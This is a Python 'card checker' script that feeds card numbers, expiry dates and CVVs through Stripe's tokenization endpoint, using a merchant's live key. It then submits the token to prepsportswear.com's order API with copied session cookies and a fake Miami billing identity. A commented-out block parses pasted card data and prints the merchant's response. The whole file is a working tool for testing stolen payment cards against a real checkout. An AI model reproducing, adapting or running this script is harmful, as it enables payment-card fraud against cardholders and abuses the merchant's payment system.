import requests
import re


def chak(cc, mes, ano, cvv):
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'es-ES,es;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    }

    data = f'card[name]=Juan+manuel&card[address_line1]=8550+nw+70th+st+apt+113545&card[address_line2]=&card[address_city]=Miami&card[address_state]=FL&card[address_zip]=33166&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&email=sdfbwdfgb%40fgmai.com&guid=bfc38c7a-bfea-4b6d-9414-ac2f21463eceb64cc8&muid=d36745af-1f26-4fad-9969-b098aaab62dccaaa1d&sid=a8cf4fdf-0a4f-46e2-9019-909e2de7ccc859f57f&payment_user_agent=stripe.js%2F1c4929adc9%3B+stripe-js-v3%2F1c4929adc9%3B+card-element&time_on_page=23034&key=pk_live_7xS0ogDNa9kobWGvCMA0pLsZ'

    try:

        req1 = requests.post(
            'https://api.stripe.com/v1/tokens', headers=headers, data=data)
#        print(req1.text)
        idw = req1.json()['id']
        if not idw:
            return req1
        else:
            cookies = {
                'guid': 'c613edd4-45e4-44a4-8eba-570181db9662',
                'SERVER': 'ps-client-ois',
                'adsystem': 'direct%20hit',
                'adkeyword': 'direct%20hit',
                'longad': 'direct%20hit_direct%20hit',
                'comm100_visitorguid_10002809': '34dcd9e8-d17f-41ab-bcc8-16a69f4d1885',
                'AuthCookie': '19AE95EB9FAFB7BDEDB4C778F71ADF888DD0E8D3DE58A626E026FF99F7AF295D0226EFD9E6170E785542EC6AAA136F2E79A5D03852960BD7FE467749A2A304458B7102DDE8B25D5D273EBA4BF55BE50695A487D3EBF9B2E848C1BE09930B977938F14D6F71C5073782800FD2C6833CF8E8C1A10C77B5BE3424F95C39BC29AABF041A0736E529815F169219B57FFD180EEA05C826597F337CC63AAB225EB558F7AD211149565D5D5E95FE96F56AC423DAF1289D0B03064A8DD49BDF7639E26802B39BFA9F',
                'SchoolID': '2583714',
                'ASP.NET_SessionId': 'j53zsqc5s43hynfpdljkyjf1',
                'up_ss': 'm',
                'up_pp': '%7c34%7c2024',
                'ls': '',
                '__stripe_mid': 'd36745af-1f26-4fad-9969-b098aaab62dccaaa1d',
                '__stripe_sid': 'a8cf4fdf-0a4f-46e2-9019-909e2de7ccc859f57f',
            }

            headers = {
                'Accept': '*/*',
                'Accept-Language': 'es-ES,es;q=0.9',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json',
                'Origin': 'https://prepsportswear.com',
                'Referer': 'https://prepsportswear.com/checkout/shippingandbilling',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }

            params = ''

            json_data = {
                'BillingCard': True,
                'BillingCity': 'Miami',
                'BillingCountry': 'United States',
                'BillingEmailAddress': 'sdfbwdfgb@fgmai.com',
                'BillingEmailAddressConfirm': 'sdfbwdfgb@fgmai.com',
                'BillingFirstName': 'Juan',
                'BillingLastName': 'manuel',
                'BillingPhone': '',
                'BillingState': 'FL',
                'BillingStreetAddress2': '',
                'BillingStreetAddress': '8550 nw 70th st apt 113545',
                'BillingZipCode': '33166',
                'IsSubscription': True,
                'SameAsShipping': True,
                'ShippingCity': 'Miami',
                'ShippingCountry': 'United States',
                'ShippingFirstName': 'Juan',
                'ShippingLastName': 'manuel',
                'ShippingState': 'FL',
                'ShippingStreetAddress2': '',
                'ShippingStreetAddress': '8550 nw 70th st apt 113545',
                'ShippingZipCode': '33166',
                'StripeTokenId': req1.json()['id'],
            }

            response = requests.post('https://prepsportswear.com/api/orders',
                                     params=params, cookies=cookies, headers=headers, json=json_data)
            return response
    except:
        return req1


"""
msg = input('ccs: ')
ccs = re.findall(r'[0-9]+',msg)
cc = ccs[0]
mes = ccs[1]
ano = ccs[2]
cvv = ccs[3]

print(chak(cc,mes,ano,cvv).text)"""
